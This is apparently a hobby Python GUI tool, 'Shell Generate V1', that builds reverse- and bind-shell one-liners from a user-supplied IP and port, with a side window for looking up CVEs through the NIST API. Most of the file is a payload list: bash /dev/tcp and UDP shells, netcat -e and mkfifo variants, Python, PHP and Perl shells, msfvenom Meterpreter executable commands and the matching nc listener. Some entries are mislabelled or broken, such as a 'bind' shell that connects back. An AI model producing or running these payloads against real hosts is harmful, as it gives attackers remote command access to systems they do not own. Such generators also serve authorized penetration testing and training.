import customtkinter as cutk
import requests
import json
import textwrap
import server_part
from PIL import Image, ImageTk

PORT = int()
IP = str("Your_IP")
SHELL = "bash" # By default is `bash`
shell_option = ["/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "pwsh", "ash", "bsh", "csh", "ksh", "zsh", "pdksh", "tcsh", "mksh", "dash"]


def check_cve(cve_id):
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}" #Testat pentru ID:CVE-2019-1010218
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for non-200 status codes
        cve_info = response.json()
        return cve_info
    except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
        print("Error:", e)
        return None 

def open_check_CVE_NIST():
    new_window = cutk.CTkToplevel(app)
    new_window.title("NIST API")
    new_window.geometry("600x400")
    
    label = cutk.CTkLabel(new_window, text="Enter CVE ID:")
    label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
    
    entry = cutk.CTkEntry(new_window)
    entry.grid(row=0, column=1, padx=10, pady=10, sticky="w")
    
    def get_cve_info():
        cve_id = entry.get()
        cve_info = check_cve(cve_id)
        if cve_info and "vulnerabilities" in cve_info:
            # Assuming we want to print details of the first vulnerability if multiple vulnerabilities are returned
            vulnerability = cve_info["vulnerabilities"][0]
            cve = vulnerability["cve"]
            cve_details = f"CVE ID: {cve['id']}\n"
            cve_details += "Description:\n"
            for description in cve["descriptions"]:
                wrapped_text = textwrap.fill(description['value'], width=80)  # Wrap text to 80 characters per line
                cve_details += f"- {wrapped_text}\n"
            
            if "metrics" in vulnerability:
                cve_details += "Severity:\n"
                for metric in vulnerability["metrics"].get("cvssMetricV3", []):
                    cve_details += f"- CVSS v3 Base Score: {metric['cvssData']['baseScore']} ({metric['cvssData']['baseSeverity']})\n"
                for metric in vulnerability["metrics"].get("cvssMetricV2", []):
                    cve_details += f"- CVSS v2 Base Score: {metric['cvssData']['baseScore']} ({metric['baseSeverity']})\n"
            else:
                cve_details += "Severity: Not available\n"

            result_label.configure(text=cve_details)
        else:
            result_label.configure(text="CVE not found or error in fetching details.")

    check_button = cutk.CTkButton(new_window, text="Check CVE", command=get_cve_info)
    check_button.grid(row=1, column=0, padx=10, pady=10)

    result_label = cutk.CTkLabel(new_window, text="", width=500, height=300, anchor="nw", justify="left")
    result_label.grid(row=2, column=0, columnspan=2, padx=10, pady=10, sticky="w")

    new_window.mainloop()

# Function to clear the scrollable frame
def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def copy_to_clipboard():
    app.clipboard_clear()
    app.clipboard_append(shell_label.cget("text"))
    app.update()  # necessary to update the clipboard contents

def set_shell(shell_from_user):
    global SHELL
    SHELL = shell_from_user
    print(f"Selected: {SHELL}")

def get_the_port_from_user(event):
    global PORT
    PORT = port_entry.get()
    print(f"nc -lvnp {PORT}")
    if int(PORT) <= 1024:
        cat_image = Image.open("emoji/cry_cat.png")  # Replace with your emoji image path
        cat_image = cat_image.resize((40, 40), Image.LANCZOS)  # Resize the image if necessary
        cat_photo = ImageTk.PhotoImage(cat_image)

                                                                    #cat_label = cutk.CTkLabel(master=listent_frame, text="", image=cat_photo)
                                                                    #cat_label.grid(row=1, column=1)
        listent_label.configure(text=f"   sudo nc -lvnp {PORT}",font=("Arial", 20), text_color="red")       #Nu am inteles de ce dar lucreaza si fara asta HZ de ce ?????
        listent_label.configure(compound="left", image=cat_photo)
                                                                    #cat_label.image = cat_photo
    else:
        # Dacă portul nu este mai mic decât 1024, distrugeți emoji-ul cu pisică plângătoare
        if 'cat_photo' in locals():
            cat_photo.destroy()
        listent_label.configure(text=f"nc -lvnp {PORT}")
    #shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def get_the_ip_from_user(event):
    global IP
    IP = ip_entry.get()
    print(f"IP input {IP}")
    #shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def ret_bash_i():
    shell_label.configure(text=f"{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def ret_bash_196():
    shell_label.configure(text=f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196")

def ret_bash_read_line():
    shell_label.configure(text=f"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done")

def ret_bash_5():
    shell_label.configure(text=f"{SHELL} -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5") 

def ret_bash_UDP():
    shell_label.configure(text=f"{SHELL} -i >& /dev/udp/{IP}/{PORT} 0>&1")

def ret_nc_mkfifo():
    shell_label.configure(text=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{SHELL} -i 2>&1|nc {IP} {PORT} >/tmp/f")

def ret_nc_e():
    shell_label.configure(text=f"nc {IP} {PORT} -e {SHELL}")

def ret_nc_exe():
    shell_label.configure(text=f"nc.exe {IP} {PORT} -e {SHELL}")

def ret_busy_box():
    shell_label.configure(text=f"busybox nc {IP} {PORT} -e {SHELL}")

def ret_nc_c():
    shell_label.configure(text=f"nc -c {SHELL} {IP} {PORT}")

def ret_python_bind():
    shell_label.configure(text=f'''
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("{IP}",{PORT}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
''')

def show_reverse_shell():
    clear_frame(scrollable_frame)
    buttons = [
        ("Bash -i", ret_bash_i),
        ("Bash 196", ret_bash_196),
        ("Bash read line", ret_bash_read_line),
        ("Bash 5", ret_bash_5),
        ("Bash UDP", ret_bash_UDP),
        ("nc mkfifo", ret_nc_mkfifo),
        ("nc -e", ret_nc_e),
        ("Busybox nc -e", ret_busy_box),
        ("nc -c", ret_nc_c)
    ]
    for text, command in buttons:
        button = cutk.CTkButton(master=scrollable_frame, text=text, command=command, fg_color="gray", hover_color="red")
        button.grid(padx=3, pady=3)

def show_bind_shell():
    clear_frame(scrollable_frame)
    buttons = [
        ("Python Bind", ret_python_bind),
        ("PHP Bind", lambda: shell_label.configure(text=f"php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"{SHELL} -i <&3 >&3 2>&3\");'")),
        ("nc Bind", lambda: shell_label.configure(text=f"nc -lvnp {PORT} -e /bin/sh")),
        ("Perl Bind", lambda: shell_label.configure(text="perl -e 'use Socket;$d=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));$d->bind(INADDR_ANY,PORT);listen($d,5);while(accept(C,$d)){while(<C>){exec($_);}}'"))
    ]
    for text, command in buttons:
        button = cutk.CTkButton(master=scrollable_frame, text=text, command=command, fg_color="gray", hover_color="red")
        button.grid(padx=3, pady=3)

def show_msfvenom_shell():
    clear_frame(scrollable_frame)
    buttons = [
        ("Windows\n Meterpreter\n staged reverse\n TCP(x64)", lambda: shell_label.configure(text=f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe")),
        ("Windows\n Meterpreter\n stageless reverse\n TCP(x64)", lambda: shell_label.configure(text=f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe")),
        ("Windows\n Staged reverse\n TCP", lambda: shell_label.configure(text=f"msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe")),
        ("Windows\n Stageless reverse\n TCP", lambda: shell_label.configure(text=f"msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe"))
    ]
    for text, command in buttons:
        button = cutk.CTkButton(master=scrollable_frame, text=text, command=command, fg_color="gray", hover_color="red")
        button.grid(padx=3, pady=3)

cutk.set_appearance_mode("dark")
cutk.set_default_color_theme("blue")

app = cutk.CTk()
app.geometry("900x700")
app.title("Shell Generate V1")

app.grid_rowconfigure(0, weight=1)
app.grid_columnconfigure(0, weight=1)

main_frame = cutk.CTkFrame(master=app) 
main_frame.grid(pady=30,padx=30, row=0, column=0, sticky='nsew')

main_label = cutk.CTkLabel(master=main_frame, text='Shell Generator', font=("Roboto", 32))
main_label.grid(pady=10, padx=10,row=0, columnspan=2, sticky='nsew')
API_check_CVE = cutk.CTkButton(master=main_frame,text="CVE Check", command=open_check_CVE_NIST)
API_check_CVE.grid(pady=10, padx=10,row=0, column=2, sticky='nsew')

ip_port_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
ip_port_frame.grid(pady=10, padx=10, row=1, column=0, sticky='nsew')
ip_port_frame.grid_rowconfigure(1, weight=1)
ip_port_frame.grid_columnconfigure(0, weight=1)
ip_port_frame.grid_columnconfigure(1, weight=1)

ip_port_label = cutk.CTkLabel(master=ip_port_frame, text="IP & Port")
ip_port_label.grid(padx=10, pady=10, row=0, column=0)

ip_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Enter IP")
ip_entry.grid(padx=10, pady=10,row=1, column=0)
ip_entry.bind("<Return>", get_the_ip_from_user)

port_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Port")
port_entry.grid( padx=10, pady=10, row=1, column=1)
port_entry.bind("<Return>", get_the_port_from_user)

listent_frame = cutk.CTkFrame(master=main_frame, corner_radius=10,)
listent_frame.grid(pady=10, padx=10, row=1, column=1, sticky='nsew')
listent_frame.grid_rowconfigure(0, weight=1)
listent_frame.grid_columnconfigure(0, weight=1)

listent_label = cutk.CTkLabel(master=listent_frame, text="Listener")
listent_label.grid(pady=10, padx=10)

listent_label = cutk.CTkLabel(master=listent_frame, width=320, text=f"nc -lvnp {PORT}" )
listent_label.grid()


shell_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
shell_frame.grid(row=2,columnspan=2, sticky='nsew', padx=10, pady=10)
shell_frame.grid_rowconfigure(0, weight=1)
shell_frame.grid_columnconfigure(0, weight=1)

revers_shell = cutk.CTkButton(master=shell_frame, command=show_reverse_shell, text="Reverse",fg_color="gray", hover_color="blue", corner_radius=10)
revers_shell.grid(row=0, column=0)
bind_shell = cutk.CTkButton(master=shell_frame, command=show_bind_shell, text="Bind", fg_color="gray", hover_color="blue", corner_radius=10)
bind_shell.grid(row=0, column=1)
MSF_venom = cutk.CTkButton(master=shell_frame,command=show_msfvenom_shell, text="MSFVenom",fg_color="gray", hover_color="blue", corner_radius=10)
MSF_venom.grid(row=0, column=2)


scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
scrollable_frame.grid(row=1,column=0)

pepega_image = Image.open("emoji/happy_pepe.png")  # Replace with your emoji image path
pepega_image = pepega_image.resize((50, 50), Image.LANCZOS)  # Resize the image if necessary
pepega_photo = ImageTk.PhotoImage(pepega_image)

#pepega_label = cutk.CTkLabel(master=shell_frame, text="", image=pepega_photo)
#pepega_label.grid(row=1, column=1)
#pepega_label.image = pepega_photo

shell_label = cutk.CTkLabel(master=shell_frame, text="   Enter your IP and Port PLS!!!", font=("Aria", 20), wraplength=500)
shell_label.grid(row=1, column=1 ,columnspan=2)

# Utilizați opțiunea compound pentru a afișa imaginea și textul împreună
shell_label.configure(compound="left", image=pepega_photo)

copy_button = cutk.CTkButton(main_frame, text="Copy to Clipboard", command=copy_to_clipboard)
copy_button.grid( row=3, column=1, pady=(10, 0), sticky='ew')

option_menu = cutk.CTkOptionMenu(master=shell_frame, values=shell_option, command=set_shell)
option_menu.grid(row=3, column=3, pady=20, padx=20) 

meme_button = cutk.CTkButton(master=main_frame, text="🐣Easter Egg", command=server_part.open_local_server)
meme_button.grid(row=3, column=0, pady=(10, 0), sticky='ew')
app.mainloop()
